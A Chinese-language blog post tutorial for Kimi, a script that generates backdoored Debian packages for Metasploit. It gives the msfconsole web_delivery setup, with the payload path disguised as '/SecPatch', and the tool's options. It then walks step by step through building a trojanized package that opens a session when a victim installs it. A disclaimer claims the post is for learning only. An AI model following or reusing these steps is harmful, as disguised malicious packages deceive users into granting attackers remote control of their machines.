---
title: Linux_inject_kimi | MSF | kali linux 2017
date: 2017-10-15 11:15:21
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/Linux-inject-kimi.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


##  简介
```markdown
Kimi的名字灵感来源于“Kimimaro”，是动画片“火影忍者”的动画片之一。
Kimi是一个为metasploit生成恶意debian软件包的脚本
它由bash文件组成。 bash文件被部署到“/usr/local /bin/”目录中。
当受害者尝试安装deb包由于postinst文件时，后门被执行
Bash文件注入，也像一些受害者执行时的系统命令
攻击者与会话点击。
- 完全独立 意味着用户不需要安装任何debian包创建者
- 可以与任何有效载荷发生器集成，
Kimi基本上取决于web_delivery模块，每件事情都是自动化的。
所有的攻击者需要做以下设置：
```
![enter description here][2]

<pre>
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set srvhost 192.168.0.102
srvhost => 192.168.0.102
msf exploit(web_delivery) > set uripath /SecPatch
uripath => /SecPatch
msf exploit(web_delivery) > set Lhost 192.168.0.102
Lhost => 192.168.0.102
msf exploit(web_delivery) > show options
msf exploit(web_delivery) > exploit
</pre>
github: https://github.com/ChaitanyaHaritash/kimi
</p>
<strong><span style="color: #ff0000;">声明：本文内容仅供交流学习使用，一切由使用者造成的法律问题，均由使用者自行承担！本站及作者概不负责！</span></strong>
</p>
制作这种过程也是很简单,先来简单的看下帮助参数
<pre>
  -h, --help         列举一些帮助参数
  -n NAME,  -n  参数 后面需要跟上Deb包的名称
  -l LHOST, --lhost （-l 参数 后面需要跟上本机的IP	地址）
                        LHOST, for Handler
  -V VERS,  （-V 参数跟上随意指定版本信息以区分之前的包）
  -a ARCH, --arch ARCH  Architecture (i386/amd64) （-a 参数 需指定平台架构 如i386/amd64）
</pre>


## 使用
那么我们来简单看下需要用的参数:
&nbsp;
![enter description here][3]
&nbsp;

1.首先需要一个Deb 包：我这里随便弄了个包 之前有在 http://www.ggsec.cn/Debinject.html 用到过。
我这里重命名为f。便于写。![enter description here][4]
那么-n 的参数跟上 f （以包名称为准）

2.填上ip地址 -l 192.168.1.103 
&nbsp;
![enter description here][5]
&nbsp;
 
 3.添加平台架构  -a amd64 (我这里是64位的 所以填写amd64，根据目标机情况填写 )
![enter description here][6]


4.添加版本-V 参数跟上随意指定版本信息以区分之前的包 ![enter description here][7]

## 生成并解压，得到会话
&nbsp;
![enter description here][8]
&nbsp;
生成了backdoor![enter description here][9]
&nbsp;
![enter description here][10]
&nbsp;


在此期间会开启虚拟终端（xterm）
&nbsp;
![enter description here][11]
![enter description here][12]
&nbsp;
![enter description here][13]
&nbsp;
这个是xterm
![enter description here][14]

解压backdoor
![enter description here][15]


并且得到会话
&nbsp;
![enter description here][16]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/B46C191A74189731E83B64602C5CF707.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508039936984.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041138026.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041076595.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041273641.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041369868.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041517597.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041977046.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042235136.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042297286.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042427222.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042205105.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042169268.jpg
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042349332.jpg
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042528761.jpg 
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1508037428945.jpg